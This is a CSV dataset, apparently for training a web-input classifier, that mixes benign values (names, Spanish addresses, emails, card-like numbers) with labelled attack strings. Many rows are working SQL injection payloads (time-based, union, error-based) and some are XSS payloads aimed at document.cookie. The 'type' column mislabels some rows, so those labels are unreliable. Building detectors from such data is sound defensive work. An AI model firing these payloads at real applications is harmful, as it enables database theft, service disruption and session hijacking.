Text,attack_type,Label,type
"1' where 6417=6417 or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
woodburn@vinavilano.hr,norm,0,normal
net.valdez@salaparis.gt,norm,0,normal
callie,norm,0,normal
"sierra de la estrella, 86,",norm,0,normal
uzaki@23horas.ie,norm,0,normal
1)));begin dbms_lock.sleep(5); end--,sqli,1,sql
"<style type=""text/css"">body{background:url(""javascript:document.cookie=true"")}</style>",xss,2,xss
"1"" union all select null,null,null,null,null,null,null,null,null,null--",sqli,1,sql
tolox,norm,0,normal
1)) and 4637=1408 and ((6509=6509,sqli,1,normal
1')) as txxn where 7884=7884 and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--,sqli,1,sql
7548043709154269,norm,0,normal
"calle conjunto avenida, 116",norm,0,normal
"1' union all select null,null,null,null,null,null,null--",sqli,1,sql
"1"") where 9447=9447;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
vlor,norm,0,normal
"elt(5098=2728,1)",sqli,1,normal
1901048287713824,norm,0,normal
"-9764' where 1266=1266 or elt(4069=6162,6162)--",sqli,1,sql
lubna,norm,0,normal
basta,norm,0,normal
ludwig_schuster@viavilano.web,norm,0,normal
lindon,norm,0,normal
"<a href=""about:<script>document.cookie=true;</script>"">",xss,2,xss
36384,norm,0,normal
"1"") and (select * from (select(sleep(5)))gcrr)#",sqli,1,sql
1)));select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#,sqli,1,sql
1 union all select null--,sqli,1,sql
40162,norm,0,normal
tolomei vil,norm,0,normal
3074429999083032,norm,0,normal
"sinoga 167,",norm,0,normal
"1"")) and (select * from (select(sleep(5)))fzno) and ((""ykhp"" like ""ykhp",sqli,1,sql
perl,norm,0,normal
evin,norm,0,normal
1'||(select 'tznb' from dual where 8808=8808 rlike (select * from (select(sleep(5)))vwyq)#,sqli,1,sql
9469363805920564,norm,0,normal
"1))) or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (((8814=8814",sqli,1,sql
1')) and (select * from (select(sleep(5)))fzno) and (('wevl'='wevl,sqli,1,sql
8591525161088176,norm,0,normal
hounsell,norm,0,normal
-5751) as jybu where 4739=4739 or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--,sqli,1,sql
0646137347424943,norm,0,normal
"1')) as arhm where 3268=3268 or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))--",sqli,1,sql
s0308ga52r,norm,0,normal
(select (case when (5603=5603) then 5603 else cast(1 as int)/(select 0 from dual) end) from dual),sqli,1,sql
4430,norm,0,normal
33095587j,norm,0,normal
carew1@koinup.ni,norm,0,normal
2630,norm,0,normal
remington,norm,0,normal
37882,norm,0,normal
busqu,norm,0,normal
62258107m,norm,0,normal
"1) as wxms where 7272=7272 and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,1,sql
"calle platerias, 47",norm,0,normal
5806,norm,0,normal
"1';call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and 'ekhi'='ekhi",sqli,1,sql
"1"")) and elt(6553=4771,4771) and ((""eolu""=""eolu",sqli,1,normal
kwokchoi,norm,0,normal
e70alabe4nar,norm,0,normal
"1%"")) union all select null,null,null,null,null,null,null,null,null#",sqli,1,sql
5093,norm,0,normal
mcallum,norm,0,normal
"-3672"")) union all select 6093#",sqli,1,sql
lumbrales,norm,0,normal
neira umbert,norm,0,normal
"-1083%""))) or elt(1032=1032,3623) and (((""%""=""",sqli,1,normal
litt,norm,0,normal
04711214d,norm,0,normal
7583890379589954,norm,0,normal
"-5513""))) or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and (((""ovmk"" like ""ovmk",sqli,1,sql
"1'))) or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ((('vjkf' like 'vjkf",sqli,1,sql
"1%""))) and 3116=9088#",sqli,1,normal
"-9762) or elt(5773=8986,8986)",sqli,1,normal
macilento,norm,0,normal
"c/ madre castisima, s/n",norm,0,normal
c/ san antonio 65 12?a,norm,0,normal
"1"" where 7371=7371 waitfor delay '0:0:5'--",sqli,1,sql
nancy,norm,0,normal
1')) as zffq where 9572=9572 or 6793=(select 6793 from pg_sleep(5))--,sqli,1,sql
"1"")) as fmul where 7827=7827;waitfor delay '0:0:5'--",sqli,1,sql
giribet armisn,norm,0,normal
yahed,norm,0,normal
poshiu,norm,0,normal
"1""))) and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (((""urgd""=""urgd",sqli,1,sql
alins,norm,0,normal
"1""))) or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and (((""hkjm"" like ""hkjm",sqli,1,sql
"1%"")));select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and (((""%""=""",sqli,1,sql
"-3250%"" union all select 7162,7162,7162,7162,7162,7162,7162,7162,7162--",sqli,1,sql
"1"") as duvm where 6190=6190 order by 1--",sqli,1,sql
ostapovich furnari,norm,0,normal
02247,norm,0,normal
13791863m,norm,0,normal
cherwin4@xavipetit.mu,norm,0,normal
"-8238')) union all select 9797,9797,9797,9797,9797,9797,9797,9797#",sqli,1,sql
magdi,norm,0,normal
apartadero,norm,0,normal
16537,norm,0,normal
-6540') where 5019=5019 or (8459=8459)*4906--,sqli,1,sql
7671256025414035,norm,0,normal
"c/ antonia lancha, 38, 1?h",norm,0,normal
terencio,norm,0,normal
39669776c,norm,0,normal
bebedizo,norm,0,normal
consist+ente,norm,0,normal
46688,norm,0,normal
frechette8@legami.ly,norm,0,normal
netty9,norm,0,normal
"campo de mirra/camp de mirra, el",norm,0,normal
sukarrieta,norm,0,normal
musi@inmobiliariahangar.vn,norm,0,normal
"1) or 8156=(select count(*) from generate_series(1,5000000))--",sqli,1,sql
1%' and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and '%'=',sqli,1,sql
8664,norm,0,normal
61877469v,norm,0,normal
calle federico mompou 144 11-d,norm,0,normal
"1,(select (case when (7734=7734) then (select benchmark(5000000,md5(0x72747341))) else 7734*(select 7734 from mysql.db) end))",sqli,1,sql
"1') where 4297=4297 or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,1,sql
04858,norm,0,normal
1) or 6793=(select 6793 from pg_sleep(5)) and (7015=7015,sqli,1,sql
"""</comment><img src=x onerror=alert(1)//"">",xss,2,xss
nooshin,norm,0,normal
983tau027iv1,norm,0,normal
"1' procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and 'hofy' like 'hofy",sqli,1,normal
"c/ iglesia, s/n 11?f",norm,0,normal
"1"") union all select null,null,null#",sqli,1,sql
indamira,norm,0,normal
"1"" and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)",sqli,1,sql
tharsis s/n 11?c,norm,0,normal
"1%"") union all select null,null,null#",sqli,1,sql
"1%"")) and make_set(9897=5557,5557) and ((""%""=""",sqli,1,normal
rbano chaves,norm,0,normal
joffe,norm,0,normal
chalia,norm,0,normal
zumave gancedo,norm,0,normal
"-5579%"") or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (""%""=""",sqli,1,sql
selbrede,norm,0,normal
"1) and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161)",sqli,1,sql
"1"");select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and (""layz""=""layz",sqli,1,sql
"1"");select case when 1892=3646 then 1 else null end--",sqli,1,sql
63171354z,norm,0,normal
ippolito,norm,0,normal
"-7422"" union all select 9127,9127,9127,9127,9127,9127,9127,9127,9127,9127#",sqli,1,sql
1'+(select bfeq where 3445=3445 and 9198=9198--,sqli,1,sql
modugno@wdsl.int,norm,0,normal
"1%""))) and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (((""%""=""",sqli,1,normal
"1)) union all select null,null,null,null,null,null,null,null,null#",sqli,1,sql
nobel,norm,0,normal
8889874100386477,norm,0,normal
"1%"")) order by 1--",sqli,1,sql
"1""))) or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and (((""ddun""=""ddun",sqli,1,sql
1814084012510251,norm,0,normal
mandayona,norm,0,normal
"1' where 8729=8729;select benchmark(5000000,md5(0x714e4153))#",sqli,1,sql
"1"")) as gawq where 4728=4728 or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,1,sql
corrius,norm,0,normal
"-2568"") or (8459=8459)*4906 and (""exyw""=""exyw",sqli,1,normal
"1'||(select 'iuud' where 3687=3687;select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",sqli,1,sql
ch35isca,norm,0,normal
"calle prat de la riba, 73",norm,0,normal
80396628j,norm,0,normal
"1"")) as wwqj where 3249=3249 and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,1,sql
el khouri hausdorf,norm,0,normal
montagnani_walling@am-si.sh,norm,0,normal
0629460582671873,norm,0,normal
"plza. salamanca 39,",norm,0,normal
1%' and 4595=4595#,sqli,1,normal
1') as svtm where 7627=7627 rlike (select * from (select(sleep(5)))sgvo)--,sqli,1,sql
"1%') and 2388=benchmark(5000000,md5(0x6d457153))#",sqli,1,normal
"calle castilla, 142 11?c",norm,0,normal
"-2241))) or make_set(9354=9354,7185) and (((6840=6840",sqli,1,normal
"1%"" union all select null,null,null,null,null,null,null,null,null--",sqli,1,sql
perene,norm,0,normal
98538229l,norm,0,normal
"-2072"") as rjcz where 2491=2491 or 6872=6872--",sqli,1,sql
"1) where 4711=4711;select count(*) from generate_series(1,5000000)--",sqli,1,sql
steklasa,norm,0,normal
491vi06a5,norm,0,normal
mae,norm,0,normal
1%' and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and '%'=',sqli,1,sql
1') and 9198=9198--,sqli,1,sql
"1) as wbcd where 9506=9506 or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x)--",sqli,1,sql
34340,norm,0,normal
yoe,norm,0,normal
"1"")) and (1248=8705)*8705 and ((""wvma"" like ""wvma",sqli,1,normal
"1 or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)",sqli,1,sql
"1%') union all select null,null,null,null,null,null,null--",sqli,1,sql
totolate,norm,0,normal
"1'+(select 'phtz' where 3171=3171;select count(*) from generate_series(1,5000000)--",sqli,1,sql
"1'))) or 8421=(select count(*) from generate_series(1,5000000)) and ((('bmzj' like 'bmzj",sqli,1,sql
ivana,norm,0,normal
weddle@teamspanish.bz,norm,0,normal
1)) and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((9452=9452,sqli,1,sql
ethan,norm,0,normal
pechur@spainbareback.fm,norm,0,normal
vilafranca de bonany,norm,0,normal
1 and 6969=(select 6969 from pg_sleep(5))-- yczq,sqli,1,sql
"1%""));select pg_sleep(5)--",sqli,1,sql
"calle teresa pamies i bertran 21,",norm,0,normal
78608268h,norm,0,normal
pesantez,norm,0,normal
"<meta http-equiv=""refresh"" content=""0;url=data:text/html;base64,phnjcmlwdd5hbgvydcgnwfntjyk8l3njcmlwdd4k"">",xss,2,sql
"nao victoria, 79, 12?h",norm,0,normal
1;select pg_sleep(5)# pjvi,sqli,1,sql
84276481l,norm,0,normal
resuela,norm,0,normal
"-3361)) union all select 2827,2827,2827,2827#",sqli,1,sql
7194366755548544,norm,0,normal
41953346n,norm,0,normal
"1'))) and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1,sql
"c/ secretario guedes aleman s/n,",norm,0,normal
"murillo, 185 2f",norm,0,normal
rochas comamala,norm,0,normal
47282,norm,0,normal
1') as qcse where 4147=4147 waitfor delay '0:0:5'--,sqli,1,sql
"-9263') as qodg where 6798=6798 or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",sqli,1,sql
34855320q,norm,0,normal
2354,norm,0,normal
86704903d,norm,0,normal
arbizu,norm,0,normal
"1' and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and 'ulep'='ulep",sqli,1,sql
nemea,norm,0,normal
l23re1o,norm,0,normal
24730,norm,0,normal
"1"" or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ""ctdc""=""ctdc",sqli,1,sql
marcolina,norm,0,normal
1%');select (case when (3855=3855) then 3855 else 1/(select 0) end)--,sqli,1,sql
korbel,norm,0,normal
dieasl_yannatos@vilainstal.coop,norm,0,normal
"c/ torcuato perez, 69,",norm,0,normal
ex074ico,norm,0,normal
"c/ severo ochoa, 133 13?c",norm,0,normal
"-9183"") as wctu where 2058=2058 or 3038=3038",sqli,1,normal
b1a838c2fal8,norm,0,normal
silde,norm,0,normal
almagrar,norm,0,normal
<script>alert(document.cookie)</script>,xss,2,xss
ozselcuk,norm,0,normal
milka,norm,0,normal
"1' where 7688=7688 union all select null,null,null,null,null,null,null,null,null--",sqli,1,sql
giovanni,norm,0,normal
"1' where 2332=2332 or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,1,sql
"-1447"" union all select 3013,3013,3013,3013,3013,3013,3013--",sqli,1,sql
"-1438 where 6759=6759 union all select 6759,6759#",sqli,1,sql
-7864 or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))# twpw,sqli,1,sql
7964537114213279,norm,0,normal
76415058l,norm,0,normal
"</title><script>alert(""crosssitescripting"");</script>",xss,2,xss
"1%"")) union all select null,null,null,null,null,null,null,null,null,null#",sqli,1,sql
9521913109769940,norm,0,normal
oropelero,norm,0,normal
"-3475"" or elt(5532=4242,4242)",sqli,1,normal
09226,norm,0,normal
-8071)) or 9160=4253,sqli,1,normal
bechara,norm,0,normal
"1')) or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (('ozan'='ozan",sqli,1,sql
boreo@creacionesdolcevita.mo,norm,0,normal
5955499779082476,norm,0,normal
12489,norm,0,normal
nayme,norm,0,normal
daigneau,norm,0,normal
"1'+(select wkay where 5476=5476 and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null))+'",sqli,1,sql
1';begin dbms_lock.sleep(5); end,sqli,1,sql
"san lazaro, 34",norm,0,normal
"1"" and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ""arqb"" like ""arqb",sqli,1,sql
1o510426,norm,0,normal
